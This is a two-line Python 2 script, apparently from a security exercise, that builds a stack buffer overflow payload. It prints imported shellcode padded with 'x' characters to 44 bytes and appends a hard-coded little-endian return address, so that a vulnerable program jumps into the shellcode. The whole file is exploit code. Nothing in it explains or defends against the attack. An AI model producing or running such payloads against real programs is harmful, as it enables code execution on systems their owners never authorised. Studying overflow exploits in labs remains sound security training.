from shellcode import shellcode
print shellcode + (44 - len(shellcode)) *'x' + '\x80\xae\xfe\xff'